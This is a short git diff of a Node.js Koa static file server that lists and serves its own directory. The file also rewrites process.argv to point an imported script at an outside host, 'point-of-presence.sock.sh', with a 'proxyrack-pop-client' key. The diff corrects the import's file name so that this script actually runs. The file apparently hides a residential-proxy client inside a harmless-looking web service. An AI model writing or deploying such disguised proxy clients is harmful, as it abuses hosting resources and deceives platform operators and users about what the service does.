@@ -7,5 +7,5 @@ import list from 'koa2-serve-index'
 const app = new Koa()
 app.use(list(import.meta.dirname)).use(serve(import.meta.dirname))
 process.argv = [process.execPath, 'script.js', '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443','--id', 'genezio', '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP']
-import('./scipt.js')
+import('./script.js')
 app.listen(8080)
